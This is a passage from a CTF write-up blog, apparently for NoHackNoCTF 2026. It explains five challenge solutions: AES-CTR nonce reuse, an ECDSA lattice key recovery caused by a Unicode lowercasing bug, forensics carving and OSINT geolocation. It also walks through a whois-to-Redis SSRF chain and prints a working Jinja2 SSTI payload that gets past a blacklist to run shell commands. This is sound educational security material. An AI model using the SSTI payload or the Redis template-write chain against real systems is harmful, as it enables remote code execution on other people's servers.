**Multi-signal convergence beats single-signal certainty.** Final Boarding and Kira-Notes both require four or more independent hints converging on the same answer. No single one is enough: a Jetstar Japan A320 could be at any of five airports; a Firefox history that includes a Proton link could be anywhere in the year 2026. The evidence stacking is what makes the answer over-determined rather than guessed. For any real-world triage, the disciplined pattern is to enumerate every signal in the artefact and let their intersection settle the question, rather than committing to the first hit.

## Frequently asked questions

### What is NoHackNoCTF 2026?

NoHackNoCTF 2026 (NHNC) is a CTF whose challenges span cryptography, web, forensics, and miscellaneous / OSINT categories. Flag prefix `NHNC{...}`. This writeup covers the five challenges I solved. Per-challenge READMEs, artifacts, and solver scripts are mirrored at [Abdelkad3r/NoHackNoCTF-2026](https://github.com/Abdelkad3r/NoHackNoCTF-2026).

### Why does AES-CTR collapse to a one-time pad with a reused pad?

CTR mode generates the keystream `K = E_K(N || ctr) || E_K(N || ctr+1) || ...` and XORs it with the plaintext. If two encryptions use the same `(key, nonce, starting-counter)` triple, they produce byte-identical keystreams. Given ciphertexts `C_1 = P_1 XOR K` and `C_2 = P_2 XOR K`, we have `C_1 XOR C_2 = P_1 XOR P_2` (leaking plaintext difference), and if any one plaintext is known in full, `K = C_1 XOR P_1` recovers the whole keystream, decrypting every other ciphertext under the same nonce. In modern-crypto-101, guest 2's plaintext is fully known (JSON template + public.txt values), so one XOR recovers the keystream and admin_cipher decrypts to the flag JSON.

### How does the Python `.lower()` bug in Talking to the Sun work?

Python's `str.lower()` uses the full Unicode case-folding table. Most Latin characters lowercase to one code point, but a handful do not. The Turkish U+0130 (LATIN CAPITAL LETTER I WITH DOT ABOVE, `İ`) lowercases to two code points: `i` (U+0069) followed by U+0307 (COMBINING DOT ABOVE). So `"İ" * 33000` becomes 66 000 code points after `.lower()`. The app validates length pre-lowercase (`< 39321`) but truncates for storage post-lowercase (`[:65536]`). An account of `a@ + İ×33000 + .abcdef` passes the pre-lower check (33 009 < 39 321) but overflows the storage cap after lowering (66 009 > 65 536). Two such emails with different 6-char suffixes have identical stored (truncated) accounts but different SHA-256 fingerprints, so they register as distinct users but sign under the same nonce prefix.

### What is Boneh-Venkatesan / HNP and how does it recover the ECDSA private key?

The Hidden Number Problem: given many samples `k_i = a_i · d + c_i (mod n)` where `a_i` and `c_i` are known and each `k_i` has a small unknown component, recover `d`. In Talking to the Sun each ECDSA nonce is `k_i = P · 2^128 + t_i` where `P = SHA384(salt || account)` is fixed per account and `|t_i| < 2^128`. ECDSA gives `k_i = s_i^-1 · (z_i + r_i · d) (mod n)`. Differencing against sig 0 eliminates `P` and leaves `(a_i - a_0) · d + (c_i - c_0) ≡ (t_i - t_0) (mod n)` with small residuals. Build the Boneh-Venkatesan lattice with scaling factor `s = 2^383`, reduce with LLL, and scan the reduced basis for the row whose first M entries are small and whose constant slot is `±2^512`. On a 512-bit curve, six same-prefix signatures give comfortable LLL headroom; `fpylll` finds `d` in under a second.

### Why does `whois -h HOST -p PORT` turn Who is Whois into a Redis SSRF?

`/usr/bin/whois` is a TCP client. Its default behaviour is to query registrar servers for domain lookups, but the `-h` and `-p` flags let the caller specify an arbitrary destination. The Flask app pipes user-controlled input to `/usr/bin/whois <input>` after filtering, but the character/token blacklist bans `_`, `/`, `'`, `"`, and tokens like `flag`, `popen`, `import`, while allowing space, hyphens, digits, and letters. That's enough to build `-h 127.0.0.1 -p 6379 CONFIG SET dir /app/tpl`, and Redis on localhost accepts inline (space-separated) commands terminated by `\r\n`. So the SSRF becomes a Redis client that can call `CONFIG SET dir` + `CONFIG SET dbfilename` + `SET z aaa{{payload}}bbb` + `SAVE`, writing an RDB snapshot as `/app/tpl/shell.tpl`: the exact folder Flask reads templates from.

### How does the Jinja2 SSTI bypass work with `request.args`?

The stored payload can't contain any of the blocked strings (`__globals__`, `__builtins__`, `os`, `popen`, `flag`, `/`, `_`, `'`, `"`), so the payload only writes neutral glue (`|`, `(`, `)`, `.`, letters, digits, `request`, `args`, `lipsum`, `attr`, `get`, `list`) and pulls every blocked string in as a URL parameter at render time via `request.args`:

```jinja
{{ ((lipsum|attr(request.args.g)).get(request.args.o)|attr(request.args.p))(request.args.c)|list }}
```

With `?g=__globals__&o=os&p=popen&c=/flag`, this becomes `lipsum.__globals__.get('os').popen('/flag')|list`. `lipsum` is Flask's Jinja2 helper (actually `jinja2.utils.generate_lorem_ipsum`), a regular Python function whose `__globals__` is `jinja2/utils.py`'s module dict, which already `import os` at module scope. `dict.get('os')` returns the os module. `|attr('popen')` is `getattr(os, 'popen')`. Calling it returns a pipe iterator; `|list` iterates it into a Python list of output lines, avoiding the blocked `.read()` method.

### Why is Redis SAVE into `/app/tpl` a template RCE?

Flask's `render_template` reads files from the app's configured template loader (default `jinja2.FileSystemLoader` pointing at the `templates/` directory, but this app configured `/app/tpl/` explicitly). Redis's `SAVE` writes a binary RDB snapshot to `<dir>/<dbfilename>`. Setting `dir = /app/tpl` and `dbfilename = shell.tpl` writes the RDB to `/app/tpl/shell.tpl`. When Flask's Jinja2 loader is asked for `shell`, it reads that file. The RDB is mostly binary garbage (magic bytes, length-prefixed key/value pairs, checksums), but Jinja2 treats everything outside `{{...}}` as literal output, so the payload we planted as a Redis value survives verbatim and is evaluated. Any binary noise before or after our `aaa{{...}}bbb` markers passes through as literal characters, which Jinja2 emits (possibly with `U+FFFD` for invalid UTF-8) but does not fail on.

### How does Kira-Notes go from a Firefox history file to a WZ-AES ZIP?

Five steps. (1) Query `moz_places` chronologically; the history reads as a stage direction with one Proton Drive URL that doesn't fit the browsing pattern. (2) Playwright drives Proton Drive through its SRP + PGP layers to download three files, including a 500 MB `of.img` labelled `CASE`. (3) The image is GPT-partitioned; slice out the ext4 volume. Live directory is a decoy chain of empty files spelling "I will not let you see it". (4) Carve unallocated blocks for PNG (`89 50 4E 47`/`IEND`) and ZIP (`PK\x03\x04`/`PK\x05\x06`) signatures; ext4 keeps deleted content until block reallocation. Two artefacts pop out: `wtf.png` (the untorn version of a torn note found earlier, reading `0x0Kira1337`) and `final.zip` (an AES-256 WZ-AES archive). (5) `pyzipper` opens the ZIP with password `0x0kira1337` (lowercase k). Info-Zip `unzip` refuses ("need PK compat v5.1"); stock 7-Zip on some builds reports success but writes zero bytes.

### Why do you need four independent signals to identify the airport in Final Boarding?

Any one signal alone is ambiguous. A Jetstar Japan A320 could be at KIX, NRT, HND, FUK, or CTS. A Hainan Airlines neighbouring tail could be at KIX, NRT, or NGO. SMBC jet-bridge branding could be at several Japanese airports. A long horizontal viaduct backed by mountains could be at any airport built on reclaimed land. The intersection of "Jetstar Japan A320" ∩ "Hainan Airlines apron" ∩ "SMBC bridge" ∩ "Sky Gate Bridge R viaduct with Izumi silhouette" is exactly one airport: Kansai International Terminal 1. The EXIF `GPSImgDirection = 134°` magnetic (roughly south-east) confirms the sight-line, since a T1 pier gate looking that direction sees the Sky Gate Bridge. Once the airport is pinned, the airline is pinned, and the EXIF timestamp is 14:49 JST, the Kansai timetable returns exactly one candidate (GK55 at 15:15).

### What's the broader lesson from the NoHackNoCTF 2026 track?

Every challenge pivots on a primitive that has more capability than its role in the surface application suggests. `/usr/bin/whois` is a TCP client. AES-CTR under a constant nonce is a one-time pad. ECDSA nonces derived from an attacker-influenceable identity are HNP. Python's `.lower()` is not length-preserving on Turkish `İ`. Firefox `places.sqlite` is a chronological narrative. A boarding-gate photograph is four OSINT channels stacked in one frame. The general discipline is to name the primitive's full capability *before* trusting the surface role, because the exploit almost always lives in the gap between "what this component is doing here" and "what this component is."

### Where can I find the exploit scripts?

Per-challenge READMEs, artifacts, and Python solver scripts are at [Abdelkad3r/NoHackNoCTF-2026](https://github.com/Abdelkad3r/NoHackNoCTF-2026). Each challenge directory contains a self-contained walkthrough plus a `solve.py` that reproduces the flag from the handout files (or against a fresh instance for the web / crypto-web challenges).

## Closing notes

Five challenges, five different flavours of "the primitive is more powerful than it looks." modern-crypto-101 makes AES-CTR into a one-time pad. Talking to the Sun makes ECDSA into HNP through a Python Unicode quirk. Who is Whois makes a whois lookup box into a Redis client and then into a Jinja2 SSTI. Kira-Notes makes a browser history into a forensics narrative that ends in ext4 unallocated-block carving. Final Boarding makes a phone photograph into a four-channel OSINT convergence on one specific flight. The track's design signature is precise: every solve reduces to a Python one-shot once the primitive is named, and reading the flag payload after a successful solve should feel like the writeup has already been written.

For more crypto writeups on this site, the [TraceBash CTF 2026 crypto writeup](/ctf-writeups/tracebash-ctf-2026-crypto-writeup/) covers finite-field DH small-subgroup attacks and audio-derived XOR keystream recovery. The [SEKAI CTF 2026 master writeup](/ctf-writeups/sekai-ctf-2026-writeup/) includes the `oneline6ryp7o` puzzle whose modulus `2^67 - 1` collapses to per-bit independent flags, from the same family as the "one small language detail changes everything" pattern here. For web-track material, the paired [LYKNCTF web writeup](/ctf-writeups/lyknctf-2026-web-writeup/) covers a similarly compact AES-CBC padding oracle (CBC-R) plus a five-stage SSRF → HMAC forge → Jinja2 SSTI chain that structurally rhymes with Who is Whois. The [RIFFHACK 2026 master writeup](/ctf-writeups/riffhack-2026-writeup/) covers additional Next.js and Jinja2 template-injection material. For forensics, the [LYKNCTF forensics writeup](/ctf-writeups/lyknctf-2026-forensics-writeup/) covers PNG-metadata XOR + LSB stego + JPEG-with-ZIP-append primitives. Full [CTF writeups index](/ctf-writeups/) for everything else.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is NoHackNoCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "NoHackNoCTF 2026 (NHNC) is a CTF whose challenges span cryptography, web, forensics, and miscellaneous / OSINT categories. Flag prefix NHNC{...}. This writeup covers the five challenges I solved. Per-challenge READMEs, artifacts, and solver scripts are mirrored at github.com/Abdelkad3r/NoHackNoCTF-2026."}},
    {"@type": "Question","name": "Why does AES-CTR collapse to a one-time pad with a reused pad?","acceptedAnswer": {"@type": "Answer","text": "CTR mode generates keystream K = E_K(N || ctr) || E_K(N || ctr+1) || ... and XORs it with plaintext. If two encryptions use the same (key, nonce, starting-counter) triple, they produce byte-identical keystreams. C_1 XOR C_2 = P_1 XOR P_2 leaks plaintext difference; a fully known plaintext gives K = C_1 XOR P_1, decrypting every other ciphertext under the same nonce. In modern-crypto-101, guest 2's plaintext is fully known (JSON template + public.txt), so one XOR recovers the keystream and admin_cipher decrypts to the flag JSON."}},
    {"@type": "Question","name": "How does the Python .lower() bug in Talking to the Sun work?","acceptedAnswer": {"@type": "Answer","text": "Python's str.lower() uses the full Unicode case-folding table. U+0130 (Turkish LATIN CAPITAL LETTER I WITH DOT ABOVE, 'İ') lowercases to two code points: 'i' (U+0069) + U+0307 (COMBINING DOT ABOVE). So 'İ' * 33000 becomes 66,000 code points after .lower(). The app validates length pre-lowercase (< 39321) but truncates for storage post-lowercase ([:65536]). An account a@ + İ×33000 + .abcdef passes pre-lower (33,009 < 39,321) but overflows storage after lowering (66,009 > 65,536). Two such emails with different 6-char suffixes have identical stored (truncated) accounts but different SHA-256 fingerprints, so both register as distinct users but sign under the same nonce prefix."}},
    {"@type": "Question","name": "What is Boneh-Venkatesan / HNP and how does it recover the ECDSA private key?","acceptedAnswer": {"@type": "Answer","text": "The Hidden Number Problem: given many samples k_i = a_i · d + c_i (mod n) where a_i, c_i are known and each k_i has a small unknown component, recover d. In Talking to the Sun each ECDSA nonce is k_i = P · 2^128 + t_i where P = SHA384(salt || account) is fixed per account and |t_i| < 2^128. ECDSA gives k_i = s_i^-1 · (z_i + r_i · d) (mod n). Differencing against sig 0 eliminates P and leaves (a_i - a_0) · d + (c_i - c_0) ≡ (t_i - t_0) (mod n) with small residuals. Build the Boneh-Venkatesan lattice with scaling factor s = 2^383, reduce with LLL, scan for the row whose first M entries are small and constant slot is ±2^512. Six same-prefix sigs give comfortable LLL headroom on brainpoolP512r1; fpylll finds d in under a second."}},
    {"@type": "Question","name": "Why does whois -h HOST -p PORT turn Who is Whois into a Redis SSRF?","acceptedAnswer": {"@type": "Answer","text": "/usr/bin/whois is a TCP client. -h and -p flags let the caller specify an arbitrary destination. The Flask app pipes user-controlled input to /usr/bin/whois <input> after filtering, but the blacklist bans _, /, ', \", and tokens like flag, popen, import, while allowing space, hyphens, digits, and letters. That's enough to build '-h 127.0.0.1 -p 6379 CONFIG SET dir /app/tpl'. Redis on localhost accepts inline (space-separated) commands. The SSRF becomes a Redis client that can CONFIG SET dir + dbfilename + SET z aaa{{payload}}bbb + SAVE, writing an RDB snapshot as /app/tpl/shell.tpl, Flask's template folder."}},
    {"@type": "Question","name": "How does the Jinja2 SSTI bypass work with request.args?","acceptedAnswer": {"@type": "Answer","text": "The stored payload can't contain blocked strings (__globals__, __builtins__, os, popen, flag, /, _, ', \"). So the payload only writes neutral glue and pulls blocked strings in as URL parameters via request.args: {{ ((lipsum|attr(request.args.g)).get(request.args.o)|attr(request.args.p))(request.args.c)|list }}. With ?g=__globals__&o=os&p=popen&c=/flag, this becomes lipsum.__globals__.get('os').popen('/flag')|list. lipsum is Flask's Jinja2 helper (jinja2.utils.generate_lorem_ipsum), whose __globals__ is jinja2/utils.py's module dict, which already imports os at module scope. dict.get('os') returns the os module. |attr('popen') is getattr(os, 'popen'). |list iterates the pipe into a list, avoiding blocked .read()."}},
    {"@type": "Question","name": "Why is Redis SAVE into /app/tpl a template RCE?","acceptedAnswer": {"@type": "Answer","text": "Flask's render_template reads files from the app's template loader (this app configured /app/tpl/ explicitly). Redis's SAVE writes a binary RDB snapshot to <dir>/<dbfilename>. Setting dir = /app/tpl and dbfilename = shell.tpl writes the RDB to /app/tpl/shell.tpl. When Flask's Jinja2 loader is asked for shell, it reads that file. The RDB is mostly binary garbage, but Jinja2 treats everything outside {{...}} as literal output, so the payload we planted as a Redis value between aaa/bbb markers survives verbatim and is evaluated."}},
    {"@type": "Question","name": "How does Kira-Notes go from a Firefox history file to a WZ-AES ZIP?","acceptedAnswer": {"@type": "Answer","text": "Five steps. (1) Query moz_places chronologically; the history reads as a stage direction with one Proton Drive URL that doesn't fit. (2) Playwright drives Proton Drive through SRP + PGP to download three files, including a 500 MB of.img labelled CASE. (3) GPT-partitioned; slice out the ext4 volume. Live directory is a decoy chain of empty files 'I will not let you see it'. (4) Carve unallocated blocks for PNG (89 50 4E 47/IEND) and ZIP (PK\\x03\\x04/PK\\x05\\x06) signatures. Two artefacts: wtf.png (untorn note reading 0x0Kira1337) and final.zip (AES-256 WZ-AES). (5) pyzipper opens the ZIP with password 0x0kira1337 (lowercase k). Info-Zip unzip refuses; stock 7-Zip may report success but write zero bytes."}},
    {"@type": "Question","name": "Why do you need four independent signals to identify the airport in Final Boarding?","acceptedAnswer": {"@type": "Answer","text": "Any one signal alone is ambiguous. A Jetstar Japan A320 could be at KIX, NRT, HND, FUK, or CTS. A Hainan Airlines neighbouring tail could be at KIX, NRT, or NGO. SMBC jet-bridge branding is at several airports. A viaduct in front of mountains could be at any reclaimed-land airport. The intersection of Jetstar Japan A320 + Hainan Airlines apron + SMBC bridge + Sky Gate Bridge R viaduct with Izumi silhouette is exactly Kansai T1. EXIF GPSImgDirection = 134° magnetic (south-east) confirms the sight-line. Once the airport and airline are pinned, the 14:49 EXIF timestamp lets Kansai's timetable return exactly one candidate (GK55 at 15:15)."}},
    {"@type": "Question","name": "What's the broader lesson from the NoHackNoCTF 2026 track?","acceptedAnswer": {"@type": "Answer","text": "Every challenge pivots on a primitive that has more capability than its role in the surface application suggests. /usr/bin/whois is a TCP client. AES-CTR under a constant nonce is a one-time pad. ECDSA nonces derived from an attacker-influenceable identity are HNP. Python's .lower() is not length-preserving on Turkish İ. Firefox places.sqlite is a chronological narrative. A boarding-gate photograph is four OSINT channels stacked in one frame. Name the primitive's full capability before trusting the surface role."}},
    {"@type": "Question","name": "Where can I find the exploit scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, artifacts, and Python solver scripts at github.com/Abdelkad3r/NoHackNoCTF-2026. Each challenge directory has a self-contained walkthrough plus a solve.py that reproduces the flag from the handout files (or against a fresh instance for the web / crypto-web challenges)."}}
  ]
}
</script>
